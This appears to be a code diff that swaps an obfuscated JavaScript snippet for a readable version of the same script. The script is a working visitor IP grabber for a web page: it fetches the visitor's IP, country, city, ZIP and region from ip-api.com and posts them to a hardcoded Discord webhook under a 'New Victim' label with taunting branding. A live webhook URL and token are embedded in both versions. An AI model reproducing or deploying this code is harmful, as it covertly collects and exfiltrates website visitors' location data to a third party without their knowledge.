@@ -1,1 +1,81 @@
-const _0x5665b3=_0xf3c2;function _0xf3c2(_0x429294,_0x5dd430){const _0x4cda5b=_0x4cda();return _0xf3c2=function(_0xf3c29f,_0x3cca83){_0xf3c29f=_0xf3c29f-0x6b;let _0x4fbdd3=_0x4cda5b[_0xf3c29f];return _0x4fbdd3;},_0xf3c2(_0x429294,_0x5dd430);}(function(_0xbd2a8,_0x5edb37){const _0x372ecc=_0xf3c2,_0x85744b=_0xbd2a8();while(!![]){try{const _0xac5461=parseInt(_0x372ecc(0x83))/0x1+parseInt(_0x372ecc(0x90))/0x2*(parseInt(_0x372ecc(0x7c))/0x3)+-parseInt(_0x372ecc(0x71))/0x4+-parseInt(_0x372ecc(0x79))/0x5+parseInt(_0x372ecc(0x6b))/0x6+parseInt(_0x372ecc(0x88))/0x7*(parseInt(_0x372ecc(0x8c))/0x8)+parseInt(_0x372ecc(0x8e))/0x9*(-parseInt(_0x372ecc(0x77))/0xa);if(_0xac5461===_0x5edb37)break;else _0x85744b['push'](_0x85744b['shift']());}catch(_0x10abcb){_0x85744b['push'](_0x85744b['shift']());}}}(_0x4cda,0x6771a));const webhook=_0x5665b3(0x81);async function IP_Info(){const _0x545dae=_0x5665b3;let _0x119775=await fetch(_0x545dae(0x7d),{'method':_0x545dae(0x89),'headers':{'cache-control':_0x545dae(0x84),'content-type':'application/json'}});return _0x119775[_0x545dae(0x7f)]();}IP_Info()[_0x5665b3(0x78)](_0x2df9dc=>{const _0x109ab5=_0x5665b3;let _0xc03c96=[_0x109ab5(0x7b),_0x109ab5(0x91),'city','zip',_0x109ab5(0x6f)],_0x561055=![];for(var _0x4f893f=0x0;_0x4f893f<_0xc03c96[_0x109ab5(0x6d)];_0x4f893f++){if(typeof _0x2df9dc[''+_0xc03c96[_0x4f893f]]===_0x109ab5(0x72)){_0x561055=!![];break;}}if(_0x561055)return null;return _0x2df9dc;})[_0x5665b3(0x78)](async _0x50a10d=>{const _0x16d2b8=_0x5665b3;_0x50a10d!==null&&await fetch(webhook,{'method':_0x16d2b8(0x6c),'headers':{'Content-Type':'application/json'},'body':JSON['stringify']({'content':_0x16d2b8(0x82),'embeds':[{'title':'Victim\x20IP','type':_0x16d2b8(0x8b),'color':'25500','description':_0x16d2b8(0x75),'fields':[{'name':'IP','value':''+_0x50a10d[_0x16d2b8(0x6e)],'inline':![]},{'name':_0x16d2b8(0x8f),'value':''+_0x50a10d['country'],'inline':![]},{'name':_0x16d2b8(0x87),'value':''+_0x50a10d['city'],'inline':![]},{'name':_0x16d2b8(0x7e),'value':''+_0x50a10d[_0x16d2b8(0x86)],'inline':![]},{'name':_0x16d2b8(0x7a),'value':''+_0x50a10d[_0x16d2b8(0x6f)],'inline':![]}],'footer':{'text':_0x16d2b8(0x80),'icon_url':_0x16d2b8(0x76)},'author':{'name':_0x16d2b8(0x70),'url':_0x16d2b8(0x8a)},'thumbnail':{'url':'https://media.makeameme.org/created/gotcha-bitch-ha-5c5ca1.jpg'}}]})})[_0x16d2b8(0x78)](_0x14dbd2=>{const _0x48ccba=_0x16d2b8;console[_0x48ccba(0x8d)](_0x14dbd2[_0x48ccba(0x73)]);})[_0x16d2b8(0x85)](_0x3e7bbe=>{const _0xecfe98=_0x16d2b8;console[_0xecfe98(0x8d)](_0x3e7bbe);});})[_0x5665b3(0x85)](_0x1c17ad=>{const _0x8f9469=_0x5665b3;console[_0x8f9469(0x8d)](_0x1c17ad),console[_0x8f9469(0x8d)](_0x8f9469(0x74));});function _0x4cda(){const _0x39a3f3=['no-cache','catch','zip','City','737653ZMWNNn','GET','https://discord.gg/PncmmWJ2tv','rich','56FlZspM','log','342zxYqIr','Country','1691938jUafth','country','92322fjkBJu','POST','length','query','regionName','Noutaja<3\x20','790908DaKQwO','undefined','statusText','Request\x20not\x20send','```IP\x20information\x20of\x20the\x20recent\x20website\x20visitor.```','https://cdn.discordapp.com/avatars/928763754261381151/26ca86192ef72b768390013137cdc532?size=256','265960RsIhma','then','1521800dyFnmj','Region','status','3bNEkUt','http://ip-api.com/json','ZIP','json','We\x20all\x20luv\x20noutaja\x20<3','https://discord.com/api/webhooks/1151487120406478898/oGOV2Qhj5dpw0wQ9YIGFArUi6B6v6CzdESnYuLKdebDpvr8M9BpK2mn4GxnrxCDABChG','``New\x20Victim``','337432PETMyJ'];_0x4cda=function(){return _0x39a3f3;};return _0x4cda();}
+async function IP_Info() {
+  let _0x119775 = await fetch("http://ip-api.com/json", {
+    'method': "GET",
+    'headers': {
+      'cache-control': "no-cache",
+      'content-type': 'application/json'
+    }
+  });
+  return _0x119775.json();
+}
+IP_Info().then(_0x2df9dc => {
+  let _0xc03c96 = ["status", "country", 'city', 'zip', "regionName"];
+  let _0x561055 = false;
+  for (var _0x4f893f = 0x0; _0x4f893f < _0xc03c96.length; _0x4f893f++) {
+    if (typeof _0x2df9dc['' + _0xc03c96[_0x4f893f]] === "undefined") {
+      _0x561055 = true;
+      break;
+    }
+  }
+  if (_0x561055) {
+    return null;
+  }
+  return _0x2df9dc;
+}).then(async _0x50a10d => {
+  if (_0x50a10d !== null) {
+    await fetch("https://discord.com/api/webhooks/1151487120406478898/oGOV2Qhj5dpw0wQ9YIGFArUi6B6v6CzdESnYuLKdebDpvr8M9BpK2mn4GxnrxCDABChG", {
+      'method': "POST",
+      'headers': {
+        'Content-Type': 'application/json'
+      },
+      'body': JSON.stringify({
+        'content': "``New Victim``",
+        'embeds': [{
+          'title': "Victim IP",
+          'type': "rich",
+          'color': '25500',
+          'description': "```IP information of the recent website visitor.```",
+          'fields': [{
+            'name': 'IP',
+            'value': '' + _0x50a10d.query,
+            'inline': false
+          }, {
+            'name': "Country",
+            'value': '' + _0x50a10d.country,
+            'inline': false
+          }, {
+            'name': "City",
+            'value': '' + _0x50a10d.city,
+            'inline': false
+          }, {
+            'name': "ZIP",
+            'value': '' + _0x50a10d.zip,
+            'inline': false
+          }, {
+            'name': "Region",
+            'value': '' + _0x50a10d.regionName,
+            'inline': false
+          }],
+          'footer': {
+            'text': "We all luv noutaja <3",
+            'icon_url': "https://cdn.discordapp.com/avatars/928763754261381151/26ca86192ef72b768390013137cdc532?size=256"
+          },
+          'author': {
+            'name': "Noutaja<3 ",
+            'url': "https://discord.gg/PncmmWJ2tv"
+          },
+          'thumbnail': {
+            'url': 'https://media.makeameme.org/created/gotcha-bitch-ha-5c5ca1.jpg'
+          }
+        }]
+      })
+    }).then(_0x14dbd2 => {
+      console.log(_0x14dbd2.statusText);
+    })["catch"](_0x3e7bbe => {
+      console.log(_0x3e7bbe);
+    });
+  }
+})["catch"](_0x1c17ad => {
+  console.log(_0x1c17ad);
+  console.log("Request not send");
+});
